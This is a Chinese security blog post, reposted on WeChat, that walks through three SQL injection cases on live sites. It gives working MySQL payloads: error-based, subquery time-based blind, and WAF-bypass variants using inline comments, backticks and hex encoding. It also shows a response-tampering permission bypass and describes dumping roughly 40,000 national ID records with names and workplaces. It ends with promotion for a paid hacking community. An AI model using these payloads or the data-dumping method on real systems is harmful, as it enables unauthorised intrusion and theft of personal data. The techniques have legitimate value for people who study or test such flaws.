> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493151&idx=1&sn=af1b0d7245d1c3d6c2c5518d73072414

#  手把手带你挖SQL注入——三个实战案例分享  
薛定谔不喜欢猫  神农Sec   2025-07-14 01:01  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：薛定谔不喜欢猫  
  
文章来源：https://forum.butian.net/share/4453  
  
  
**这个SQL注入有点东西**  
  
  
  
## 前言  
  
SQL注入是渗透中比较常见的漏洞类型，注入方式也是多种多样的，但waf和过滤也是多元的，这次和师傅们分享一下最近遇到的几处SQL注入，分享一下思路和注入方式，如果有理解不正确的地方，求大佬指点。  
## 第一处SQL注入  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaa7UhhVO4yFEEicc4ia2cvonpF9pjkmPOcDAFLNziagU6ycIickz1Dyczgg/640?wx_fmt=png&from=appmsg "")  
  
是在这里进行查询抓包，然后注入点在日期  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaPK6iblf3py9V8W4KD9icuSBiaSPHVgRaUNLfQKyFvNWXLEQ45JGLniarEA/640?wx_fmt=png&from=appmsg "")  
  
可以发现加入一个单引号之后，返回了报错信息，我们对报错信息进行分析一下：  
  
正常是
```
date_format('2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S')
```

  
  
然后我们添加一个单引号后变成了
```
date_format('2025-06-19 00:00:00'','%Y-%m-%d %H:%M:%S')
```

  
  
这时候我们第一步要做的是进行闭合，一开始我这里选择的是插入 ')#  
 进行闭合  
  
于是我构造了
```
2025-06-19 00:00:00') and extractvalue(1,concat(0x0a,(select user()),0x0a))#
```

  
  
但是没成功，后来又想到了date_format()是有两个参数的，于是又构造了
```
2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S') and extractvalue(1,concat(0x0a,(select user()),0x0a))#
```

  
  
但还是不对，直接本地调试一下吧  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaVM2YzAYInAXPibp6XfNfk01TYLIxjyX5yd4ibBZT238O67ibJmh2YxYfA/640?wx_fmt=png&from=appmsg "")  
  
把完整的语句放进来，然后进行调试，删除不必要的东西。  
  

```
#SELECT COUNT(1) FROM ( SELECT ss FROM patrol_task AS t JOIN sys_user AS u WHERE date_format ( t.start_time,'%Y-%m-%d %H:%M:%S') >= date_format('2025-06-11 00:00:0011111111111','%Y-%m-%d %H:%M:%S') and extractvalue(0x0a,concat(0x0a,database())))TOTAL# AND date_format (t.end_time,'%Y-%m-%d %H:%M:%S') <= date_format('2025-07-21 23:59:59','%Y-%m-%d %H:%M:%S') ORDER BY t.create_date DESC ) TOTAL
```

  
  
最后可以精简到差不多这样，后来经过本地调试之后，发现存在一个问题  
  

```
SELECT COUNT(1) FROM ( select username FROM admin AS t JOIN news AS u WHERE 1=1 and extractvalue(0x0a,concat(0x0a,database())))TOTAL#
```

  
  
这样是可以报错出结果的：  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaa2SEzSMibISNhOAicYwKrC9c26yWSTqs5Jicia5NUMkjGZuW43R3PJuabqQ/640?wx_fmt=png&from=appmsg "")  
  
也就是说，按理说我闭合后拼接
```
and extractvalue(0x0a,concat(0x0a,database())))total#
```

  
是可以爆出内容的  
  
但是网站就是无法报错，然后观察网站报错信息，发现并不是数据库的那种报错，感觉是网站框架，自定义的报错，可能压根就不会返回报错信息，于是我们尝试使用时间盲注  
  
正常来说我们闭合之后会拼接
```
if(ascii(substr(user(),1,1))>1,sleep(6),0)
```

  
  
我们继续在本地调试：  
  

```
select count(1) from (select username from admin as t join news as u where 1=1 and if(ascii(substr(user(),1,1))>1,sleep(6),0))total#
```

  
  
这是构造完的语句，发现可以延时，但是换到网站中发现并没有达到延时的效果：  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaa4w615NCrqMly1qAlqib4IEIuZXlHXAPAkT2h3lmJ4yIH3RU89QoHjNQ/640?wx_fmt=png&from=appmsg "")  
  
问题出现在条件这里：  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaKBv4StYShDvzht4iajuFPCibOEzic8o3U0gven7NGoiauibdhmTFXtiaiawag/640?wx_fmt=png&from=appmsg "")  
  
我们的注入点在这里，注入点是起始时间和终止时间  
  
这个where，后面跟着的这个条件，也就是date_format,我们在不知道有没有记录的条件下，是无法保障他是有内容(条件为真)的，就好比1=2一样，这样可能无法执行后面的延迟语句，这就是为什么在本地调试了之后没问题，但是网站还是无法进行延迟的原因。因为我们不清楚前面的判断条件是否为真。  
  
那我们有没有办法，即使前面的条件为假，也可也执行后面的语句呢？  
  
有的兄弟，有的。我们直接使用子查询  
  
这里给各位师傅们再介绍一下子查询：  
  
子查询是在语句中再嵌入一个sql语句，适合从其他表中提取数据或进行复杂条件判断时使用，最内层的语句会被优先执行，会比一些逻辑运算和算数运算的优先级高。  
  
于是我们构造一个时间盲注子查询语句：
```
#select count(1) from (select username from admin as t join news as u where 1=2 and (select 0 from (select if(ascii(substr(user(),1,1))>1,sleep(6),1))x))TOTAL#
```

  
  
我们来解析一下这个语句  
  
最内层是
```
if(ascii(substr(user(),1,1)>1,sleep(6),1))
```

  
 是一个常见的时间盲注，截取了user()的首位，进行了ascii编码，如果ascii编码的值大于1，就进行sleep(6)的命令。  
  
外面一层是
```
(select 0 from () x)
```

  
 x是给最内层的语句进行一个赋名  
  
这个语句会让系统优先执行最内层的时间盲注语句，然后判断前面的条件是否为真，这样即使前面是1=2，但是已经执行了内层的时间盲注，造成了延迟，这样就可以进行SQL注入的判断了。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaa5jh0gbbp85Wlwc0BUbQcFnEleEegHtPEvRZv4nmbWtH7PiaVPFBDSTQ/640?wx_fmt=png&from=appmsg "")  
  
所以最终我们的payload为
```
2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S') and (select 0 from (select if(ascii(substr(user(),1,1))>1,sleep(6),1))x))TOTAL#
```

  
  
达到了一个时间盲注的结果。  
## 第二处SQL注入  
  
这个SQL注入有非常严格的过滤，基本上常见的函数和常见的绕过函数都被过滤的干干净净了。  
  
首先要进行一个权限绕过：  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaiasiaiblT6vSkibdialoLHUAgsP9ydDg2uDIeEI9rUDIiabgD6hegSeftDyA/640?wx_fmt=png&from=appmsg "")  
  
有时候直接修改返回包会有意想不到的结果，直接把返回包的false改为true  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaatNqiaYrvngywmgY2BLS7tDCBRED1vAUlrYRVPWAmicWiabR7xkibcPf2Uw/640?wx_fmt=png&from=appmsg "")  
  
进来之后，也是一个查询的地方去抓包  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaa8GpBBia5T19viaxlaiavndWTnmGia3lAGDzibsjPO1x9C6o535HmribctMTQ/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaO4TrJEic1dZia1ZGkut4fsicxYgFMDlFFjVjMUm3A2jtegIjBhvhSuSlQ/640?wx_fmt=png&from=appmsg "")  
  
注入点是ordertype，一个单引号报错，两个单引号正常  
  
但是过滤非常非常严格，常见的几乎没有能用的东西,发现还是时间盲注好用，可以使用benchmark(),话不多说直接上payload，分析一波：  
  

```
orderType=1%20or%20Y(point(56.7,53.34))%20or%20(select/**/0/**/from/**/(select/**/if((ascii(right(left(user/*!55555*/(),1),1))!=1),(select/*!55555555555555555*/benchmark(511111111,1)),1))x)
```

  
  
首先是
```
1 or Y(point(56.7,53.34))
```

  
 这是使用了mysql的Y()函数去获得了Y的坐标，其实就类似于一个恒真的表达式，起到了一些绕过的作用。  
  
/**/ 绕过了空格的过滤  
  
/*!55555*/ 是mysql的内联注释  
  
left(right())的搭配使用可以绕过一些waf，提高复杂度，防止被识别到  
  
数字55555是一个任意大的版本号，当MySQL服务器版本 ≥ 指定版本号时，执行注释中的代码，由于55555不可能达到，实际上总是执行，所以通过这种方式可以绕过user()的识别。  
  
后面的
```
select/\*!55555555555555555\*/benchmark(511111111,1)
```

  
是一个原理，系统监测了select benchmark()，会被拦截，但是使用内联注释之后，就可以绕过识别，从而达到执行语句的结果。  
  
这里依旧是使用了子查询语句，我们分析代码：
```
1%20or%20Y(point(56.7,53.34))%20or%20(select/**/0/**/from/**/(select/**/if((ascii(right(left(user/*!55555*/(),1),1))!=1),(select/*!55555555555555555*/benchmark(511111111,1)),1))x)
```

  
发现使用了两个or，而Y()是恒为真的，但是我们依旧无法判断ordertype=1是否存在，如果不存在的话，那么ordertype=1为假，而Y()为真，我们最后的注入语句就无法实现精准判断，所以我们这里使用子查询语句，就不用考虑ordertype=1的真假性。  
  
系统先执行内层语句，也就是
```
select if((ascii(right(left(user/*!55555*/(),1),1))!=1),(select/*!5555555555555555555555*/benchmark(51111111,1),1))
```

  
  

```
select 0 from () x
```

  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaa7oCM47OLhEpH5924GwJY2jr7fuv25P2vbzYjdSCmoqRQfrzExrYncA/640?wx_fmt=png&from=appmsg "")  
  
达到了一个时间盲注的目的。  
## 第三处SQL注入  
  
这是一个拿身份证查信息的接口，tj是注入点，加一个单引号可以看到进行报错。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaia1g1A8IsfASAk5IubfCksicsFXt8lrrb7rm8O2TUtgkyiavOCNlE0BkA/640?wx_fmt=png&from=appmsg "")  
  
多加几个单引号，分析一下。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaUEiay5hRRoptSHXwohDQ7Dib8icib84oahComONtUPAfSZKBCYYG3H59CA/640?wx_fmt=png&from=appmsg "")  
  
可以看到原本的逻辑应该是 sfzh='123123' and xm='12331'，这里的123123是我随便输入的身份证号,12331是我随意输入的姓名。  
  
于是构造闭合，直接让
```
tj=sfzh=1#
```

  
,这样进行闭合，这样就变成了 
```
sfzh=1 and (注入语句) #
```

  
 然后这里and or 被过滤了，我选择使用 || 来代替，发现 
```
|| 1=1#
```

  
 会爆502，而 
```
|| 1=2#
```

  
 会出现内容  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaHnJibuBzh3AJEXWwjPum5It28YxAMuc6wdyHibuw2Cgx9xUsvv0b9TzQ/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaqBMT0DcgicAs3yKSUtNUllNklBavexzfKUtCm6yGh6pP7ZusyibJQFpw/640?wx_fmt=png&from=appmsg "")  
  
然后因为有报错信息，所以尝试报错注入  
  
发现extractvalue()，floor(),updatexml(),exp()什么的都被过滤了，然后使用 ` 反引号绕过。  
  

```
extractvalue
```

  
(1,
```
concat
```

  
(0x0a,
```
version
```

  
()))#  
  
也就是这样去绕过，concat()也被过滤了，直接也这样绕过。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaacqTcwczRnrA5zDgw86ZWRY6bmTWkPRQrwgjBaT9h6KGBHAviaia7OAlg/640?wx_fmt=png&from=appmsg "")  
  
成功报错注入了，后来想证明数据库是什么权限的时候，发现user()也被过滤了，但是user()是没有办法使用` 反引号去隔开绕过的，常见的方法也过滤了不少，我这里选择使用current_user去替换  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaahUmycG4QOTJC1Vl7C0QPOLFOEkeh9OLmHAh17ncZuAqSakIIYzBegg/640?wx_fmt=png&from=appmsg "")  
  
可以看到是成功报错了。  
  
`  
  
因为是使用身份证去查询的接口，想着可以查询一下有没有敏感信息，可以发现现在是已经在sfzh这个表里了，我们去查sfzh这个字段，就相对来说比较容易，我们可以使用like去进行模糊查询，比如 
```
sfzh like '1%'
```

  
  
like是一个模糊匹配的作用，而'1%'，是需要用单引号括起来的，我们这样的目的是模糊匹配sfzh这个字段，1开头的信息，也就是查询身份证号是1开头的个人信息。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaahpjVQy4Vb7Qfh30xJhePVZnmruiaMe1N0IJpjqYv2vzVQcNBB72vejw/640?wx_fmt=png&from=appmsg "")  
  
但是并没有如愿的出现内容，观察报错信息，发现单引号被转义了，这里我们使用16进制编码绕过。  
  
'2%'为0x3225  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVb5ic4kRHbm408dyL1icWYiaaS0vybLiaGgjQpuiadP88QguCTMRNSqBOeDqgGRdExHe9YZQbamWGwvrg/640?wx_fmt=png&from=appmsg "")  
  
可以看到匹配到了非常多的信息，身份证、姓名、单位、学校、等数据，然后继续匹配其他身份证开头数字，共计约4w+条身份证  
  
以上是最近在测试中遇到的较为有意思的SQL注入，希望对各位师傅们有帮助，以上是我的一些理解，如果有错误的地方，希望大佬指正。  
  
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于1000人 45元/年  
  
星球人数少于1200人 65元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKogHTNRKIZQVcM0QQE3wbFrFciafzrEaRcia7gkRFb4vujBubqic3sPIN1g/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满1000人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKovBgx57dc6Ql2yRSPBJGA5fde4sQJzOomD1GURVibZeCNzXM6iaGrSe8Q/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
